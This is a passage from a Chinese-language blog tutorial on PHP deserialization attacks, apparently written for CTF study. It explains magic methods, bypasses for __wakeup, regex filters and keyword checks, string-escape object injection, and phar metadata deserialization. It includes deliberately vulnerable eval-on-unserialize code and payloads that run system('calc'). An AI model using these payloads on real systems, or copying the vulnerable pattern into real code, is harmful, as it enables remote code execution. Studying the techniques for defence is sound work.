class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span>-&gt;secret ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//相当于执行</span></span><br><span class="line"><span class="comment">//echo $c-&gt;__toString();</span></span><br></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you never know my secret</span><br></pre></td></tr></table></figure><p>这里直接打印对象实例,会自动调用对象的<code>__toString</code>方法,这里方法名字大小写不敏感</p><h4 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h4><p>当尝试以调用函数的方式调用一个对象时<code>__invoke()</code>方法会被自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span> (<span class="string">&#x27;charmersix&#x27;</span>);</span><br></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hey charmersix!you never know my secret</span><br></pre></td></tr></table></figure><p>前面魔术方法在我们构造反序列化利用链时非常有用，必须掌握，后面方法，相对冷僻，需要熟悉</p><h4 id="set-state方法"><a href="#set-state方法" class="headerlink" title="set_state方法"></a>set_state方法</h4><p>自php5.1.0起,当调用<code>var_export()</code>导出类时,此静态方法会被调用</p><p>本方法唯一的参数是一个数组,其中包含<code>array(&#39;property&#39;=&gt;value,...)</code>格式排列的类属性</p><p>注意,这里是静态方法,和<code>__tostring</code>方法类似,不过这里主要输出类的属性结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">object</span> <span class="title function_ invoke__">__set_state</span>(<span class="keyword">array</span> <span class="variable">$properties</span>)</span><br></pre></td></tr></table></figure><h4 id="debugInfo方法"><a href="#debugInfo方法" class="headerlink" title="debugInfo方法"></a>debugInfo方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">__debugInfo</span>(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure><p>当调用<code>var_dump</code>时,调用这个方法,显示类的属性具体结构和值</p><h3 id="0x5-反序列化中的绕过"><a href="#0x5-反序列化中的绕过" class="headerlink" title="0x5 反序列化中的绕过"></a>0x5 反序列化中的绕过</h3><h4 id="绕过-wakeup方法"><a href="#绕过-wakeup方法" class="headerlink" title="绕过__wakeup方法"></a>绕过<code>__wakeup</code>方法</h4><p>这个主要是基于CVE-2016-712</p><p>具体利用时通过手动修改类的属性个数,让前后不一致时,<code>__wakeup</code>函数就会绕过执行,触发可能存在的漏洞</p><p>利用条件</p><ul><li>php5-5.6.25</li><li>php7-7.0.10</li></ul><p>在这个版本范围之内,可以用这个绕过方法,具体我们看一个栗子</p><p>将本地phpstudy中的php调整到5.6</p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$data = $_POST[&#x27;data&#x27;];</span></span><br><span class="line"><span class="comment">//unserialize($data);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>这里我们生成的payload是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//这里的1表示只有一个属性,我们手动改成2,代表有两个,但是实际只有一个,就会报错,绕过__wakeup</span></span><br></pre></td></tr></table></figure><h4 id="号绕过正则匹配"><a href="#号绕过正则匹配" class="headerlink" title="+号绕过正则匹配"></a>+号绕过正则匹配</h4><p>如果在输入参数进行了过滤，不允许输入类似<code>O:8</code>这种开头,主要是为了限制不能反序列化对象,这时候,可以通过在数字前面增加一个<code>+</code>号过滤,类似<code>O:+8</code></p><h4 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h4><p>php中也可以使用引用符号<code>&amp;</code>,这里就是传址,如果不加,就是传值</p><p>传值的最大特点就是引用可以不同,但是指向是相同的</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">&amp;<span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;love&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;you&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><p>如果在反序列化后的字符串<code>s</code>变更为大写的<code>S</code>后,就会支持将里面的字符按照\xx格式Ascii读取,绕过对关键字的检测</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>修改后的payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;n\97me&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="Exception绕过"><a href="#Exception绕过" class="headerlink" title="Exception绕过"></a>Exception绕过</h4><p>Exception是异常，看下面栗子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/f1ag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;not allow unserialize&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过破坏里面的属性格式，但是类名正确的情况，还是会执行类的析构方法</p><p>payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="字符逃逸绕过"><a href="#字符逃逸绕过" class="headerlink" title="字符逃逸绕过"></a>字符逃逸绕过</h4><p>php在序列化数据的时候，如果序列化的是字符串，就会保留该字符串的长度，然后将长度写入序列化后的数据，反序列化时就会按照长度进行读取，并且PHP底层实现上是以<code>;</code>作为分割<code>&#125;</code>作为结尾</p><p>类中不存在的属性也会进行反序列化,这里就会发生逃逸问题,而导致对象注入</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;m=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>显示结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>这里我们如果用双引号,闭合,会发现不能闭合</p><p>因为这里长度为8,它反序列化的时候,会从后面第一个双引号开始,读取6个字符作为<code>m</code>的值,即使有双引号,也不能闭合</p><p>这里序列化后进行了一次过滤,将<code>system</code>过滤为了<code>ctfshow</code>,最后序列化的结果就成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>还是从6后面读取6个字符,会读取到<code>ctsho</code>,由于没有闭合,就反序列化失败了,所以这时候,我们就逃出了1个字符w,如果我们写两个<code>system</code>让他过滤,就会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ctfshowctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>观察规律,可以知道:<code>system</code>变成<code>ctfshow</code>的时候,字母数量由12变成了14,但是序列化的时候没有变,所以写入的字符串长度依旧时12</p><p>那么按照以前的12个长度进行读取,会把2个字符逃逸出来</p><p>如果这两个字符刚好是双引号,分号,就完整的闭合了属性</p><p>这里我们用3个system就可以逃逸出3个字符，我们用<code>&quot;;&#125;</code>来结束反序列化读取</p><p><code>$b-&gt;m=&#39;systemsystemsystem&quot;;&#125;&#39;;</code>替换后得到<code>O:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:21:&quot;ctfshowctfshowctfshow&quot;;&#125;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;</code></p><p>可以看到扔掉了c这个属性的值,继续增加system的数量就可以注入我们想要的属性</p><h2 id="第三节-phar的反序列化"><a href="#第三节-phar的反序列化" class="headerlink" title="第三节 phar的反序列化"></a>第三节 phar的反序列化</h2><h3 id="0x6-什么是phar"><a href="#0x6-什么是phar" class="headerlink" title="0x6 什么是phar"></a>0x6 什么是phar</h3><p>phar是一类文件的后缀名称，也是php协议的一种</p><p>phar可以将多个php文件合并到一个独立的压缩包，相对独立，不用解压到硬盘即可运行php脚本，支持web服务器和命令行运行</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291556581.png" alt="image-20230129155652448"></p><h3 id="0x7-基于phar的反序列化"><a href="#0x7-基于phar的反序列化" class="headerlink" title="0x7 基于phar的反序列化"></a>0x7 基于phar的反序列化</h3><h4 id="phar怎么用"><a href="#phar怎么用" class="headerlink" title="phar怎么用"></a>phar怎么用</h4><p>正常来说文件包含是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于以上典型的文件包含,php底层是这么处理的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;file://flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>所以要使用<code>phar</code>包里的文件相应的使用<code>phar</code>协议进行包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;phar://com.ctfshow.fileUtil.phar/file.php&quot;</span>;  </span><br></pre></td></tr></table></figure><p>可以发现很像Java的依赖包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">//引入util.jar,使用里面的hashmap类,先声明出来,后面要用</span></span><br></pre></td></tr></table></figure><p>所以phar就可以认为是类似于Java的一种jar包, 将相对独立的多个php文件打包在一起, 组成一个独立的模块供其他应用调用, 或者干脆自己打包为一个独立的应用, 类似于我们<code>bp.jar</code></p><h4 id="phar是怎么生成的"><a href="#phar是怎么生成的" class="headerlink" title="phar是怎么生成的"></a>phar是怎么生成的</h4><p>那么如何打包一个phar文件呢,首先改一下配置文件</p><blockquote><p>[Phar]<br>; <a class="link" target="_blank" rel="noopener" href="http://php.net/phar.readonly">http://php.net/phar.readonly<i class="fas fa-external-link-alt"></i></a><br>phar.readonly = Off</p></blockquote><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291602388.png" alt="image-20230129160252331"></p><p>然后我们自己着手写一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="comment">//phar已经是个对象，然后调用方法</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/project&#x27;</span>);</span><br><span class="line"><span class="comment">//public PharData::buildFromDirectory(string $directory)</span></span><br><span class="line"><span class="comment">//dirname() 函数返回路径中的目录名称部分。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">createDefalutStub</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line"><span class="comment">//final public static Phar::createDefaultStub(?string $index = null, ?string $webIndex = null)</span></span><br></pre></td></tr></table></figure><p>然后我们需要新建一个<code>project</code>目录, 里边放上我们要打包的文件<code>/project/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag&#123;i am in phar&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>然后我们执行一下第一个<code>index.php</code>, 会发现在本地已经生成了一个<code>flag.phar</code></p><p>再写一个<code>include.php</code>来读取我们的phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.phar&quot;</span>;</span><br></pre></td></tr></table></figure><p>最终我们执行一下<code>include.php</code>, 就可以读取到flag内容</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291918762.png" alt="image-20230129191830604"></p><p>我们在包含的时候也可以不加<code>phar</code>后缀, 因为php文件没有后缀也是能读取的, like this<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292153134.png" alt="image-20230129215302039"></p><h4 id="phar是怎么反序列化的"><a href="#phar是怎么反序列化的" class="headerlink" title="phar是怎么反序列化的"></a>phar是怎么反序列化的</h4><blockquote><p>比方说这里有一个题目</p><p>文件上传， 但是不让上传php、ini、htaccess（黑名单）就可以尝试上传phar文件, phar文件里就有可能用到了<code>file_exists()</code>, 就可以利用反序列化</p></blockquote><p>phar的底层原理是c代码, 这里不再细看</p><p>当使用<code>phar::getMetadata</code>方法时, 会进行反序列化, 我们本地测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hack</span>();</span><br><span class="line"><span class="comment">//执行析构</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">buildFromDirectory</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/project&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$h</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>));</span><br></pre></td></tr></table></figure><p>我们打开phar文件可以发现, 出现了序列化的strings<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292235095.png" alt="image-20230129223513002"></p><p>执行之后, 发现本地生成了<code>flag.phar</code>, 然后尝试<code>getMetadata</code>, 看看能否反序列化hack类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">getMetadata</span>();</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292253400.png" alt="image-20230129225356303"></p><p>可以发现时成功反序列化hack类</p><p>那么有没有可以自动反序列化的方法呢, 当然有, 通过尝试, 我们发现<code>include</code>协议和<code>phar</code>协议都可以反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class 